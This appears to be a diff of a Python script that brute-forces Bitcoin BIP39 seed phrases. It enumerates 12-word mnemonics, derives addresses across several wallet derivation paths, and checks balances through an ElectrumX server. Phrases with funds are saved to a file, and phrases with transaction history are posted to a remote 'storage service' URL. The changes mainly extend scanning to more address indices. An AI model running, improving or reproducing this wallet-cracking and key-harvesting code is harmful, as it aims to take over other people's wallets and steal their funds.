@@ -11,7 +11,6 @@ from pycoin.symbols.btc import network
 from bip32utils import BIP32Key, BIP32_HARDEN
 from mnemonic import Mnemonic
 
-
 logger = logging.getLogger("iterate_mnemonic_codes")
 logger.setLevel(logging.INFO)
 formatter = logging.Formatter("%(asctime)s - %(message)s")
@@ -23,12 +22,12 @@ stderr = StreamHandler(sys.stderr)
 stderr.setFormatter(formatter)
 logger.addHandler(stderr)
 
-
 indexname = 'mnemonic_index'
 filename = 'mnemonic.txt'
 valid_with_transaction = 'valid_mnemonic.txt'
 
-derivation_paths = ["m/0'/0'",  "m/0'/0", "m/44'/0'/0'", "m/44'/0'/0'/0", "m/49'/0'/0'/0", "m/84'/0'/0'/0", "m/0"]
+derivation_paths = ["m/0'/0'", "m/0'/0", "m/44'/0'/0'", "m/44'/0'/0'/0", "m/49'/0'/0'/0", "m/84'/0'/0'/0", "m/0"]
+
 
 class MnemonicCode:
 
@@ -60,29 +59,34 @@ class MnemonicCode:
         with open(indexname, 'w') as f:
             f.write(str(index))
 
-    async def get_bitcoin_balance(self, address, mnemonic_code, path):
+    async def get_bitcoin_balance(self, address, mnemonic_code, path) -> (bool, bool):
+        '''bool: have balance, bool, have transactions'''
         async with timeout_after(30):
             async with connect_rs(self.electrumx_host, self.electrumx_port) as session:
+                have_balance, have_transaction = False, False
                 script = self.get_script(address)
                 session.transport._framer.max_size = 0
                 result = await session.send_request('query', {'items': [script], 'limit': 1})
                 logger.info("address: %s, result: %s" % (address, result))
                 if float(result[-1].strip('Balance:').strip('BTC')):
                     self.write_to_file([mnemonic_code])
+                    have_balance = True
 
                 if result[1] != 'No history found':
+                    have_transaction = True
                     print(f'save mnemonic: {mnemonic_code} to storage service.....')
                     requests.post(self.storage_url, json={
                         'mnemonic': mnemonic_code,
                         'path': path
                     })
+                return have_balance, have_transaction
 
     def write_to_file(self, prikeys=[]):
         txt = ';'.join(prikeys)
         with open(filename, 'a') as f:
-            f.writelines(txt+'\n')
+            f.writelines(txt + '\n')
 
-    def _get_words_from_idx(self, idx)-> [str]:
+    def _get_words_from_idx(self, idx) -> [str]:
         ints = []
         for _ in range(12):
             i = idx % 2048
@@ -102,27 +106,27 @@ class MnemonicCode:
         c = BIP32Key.fromEntropy(entropy)
 
         show_harden, begin_3, begin_bc = 0, 0, 0
-        p = c.ChildKey(0+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN)
+        p = c.ChildKey(0 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN)
 
         if derivation_path == "m/0'/0'":
             # bitcoin core:  m/0'/0'
             show_harden = 1
         elif derivation_path == "m/0'/0":
             # Multibit Use path m/0'/0.
-            p = c.ChildKey(0+BIP32_HARDEN).ChildKey(0)
+            p = c.ChildKey(0 + BIP32_HARDEN).ChildKey(0)
         elif derivation_path == "m/44'/0'/0'":
             # blockchain.info m/44'/0'/0'
-            p = c.ChildKey(44+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN)
+            p = c.ChildKey(44 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN)
         elif derivation_path == "m/44'/0'/0'/0":
             # bip44
-            p = c.ChildKey(44+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0)
+            p = c.ChildKey(44 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0)
         elif derivation_path == "m/49'/0'/0'/0":
             # bip 49
-            p = c.ChildKey(49+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0)
+            p = c.ChildKey(49 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0)
             begin_3 = 1
         elif derivation_path == "m/84'/0'/0'/0":
             # bip 84
-            p = c.ChildKey(84+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0+BIP32_HARDEN).ChildKey(0)
+            p = c.ChildKey(84 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0 + BIP32_HARDEN).ChildKey(0)
             begin_bc = 1
         elif derivation_path == "m/0":
             p = c.ChildKey(0)
@@ -132,7 +136,7 @@ class MnemonicCode:
 
     def _get_key_pair(self, i, p, show_harden, begin_bc, begin_3):
         if show_harden:
-            cur = p.ChildKey(i+BIP32_HARDEN)
+            cur = p.ChildKey(i + BIP32_HARDEN)
         else:
             cur = p.ChildKey(i)
 
@@ -145,7 +149,7 @@ class MnemonicCode:
             'privkey': cur.WalletImportFormat()
         }
 
-    async def check_words_at_index(self, idx)-> None:
+    async def check_words_at_index(self, idx) -> None:
         words = self._get_words_from_idx(idx)
         if not self._check_words_valid(words):
             print(f'idx: {idx} of words: {" ".join(words)} not valid, just skip...')
@@ -153,15 +157,23 @@ class MnemonicCode:
 
         for derivation_path in derivation_paths:
             p, show_harden, begin_bc, begin_3 = self._get_bip_path(words, derivation_path)
-            kp = self._get_key_pair(0, p, show_harden, begin_bc, begin_3)
-            print(f'get kp: {kp} from mnemonic: {" ".join(words)} with derivation_path: {derivation_path}')
+            idx = 0
             while True:
-                try:
-                    await self.get_bitcoin_balance(kp['address'], ' '.join(words), derivation_path)
+                kp = self._get_key_pair(idx, p, show_harden, begin_bc, begin_3)
+                have_balance, have_transaction = False, False
+                print(f'get kp: {kp} from mnemonic: {" ".join(words)} with derivation_path: {derivation_path} and index: {idx}')
+                while True:
+                    try:
+                        have_balance, have_transaction = await self.get_bitcoin_balance(kp['address'], ' '.join(words), derivation_path)
+                        break
+                    except Exception as e:
+                        print(e)
+                        time.sleep(5)
+                        break
+                if not have_balance and not have_transaction:
                     break
-                except Exception as e:
-                    print(e)
-                    time.sleep(5)
+
+                idx += 1
 
     async def start_scrap(self):
         while True:
@@ -170,9 +182,9 @@ class MnemonicCode:
             if not self.index % 100:
                 self.set_index(self.index)
 
+
 if __name__ == '__main__':
     loop = asyncio.get_event_loop()
     mnemonic_code = MnemonicCode(loop)
     loop.run_until_complete(mnemonic_code.start_scrap())
     loop.close()
-
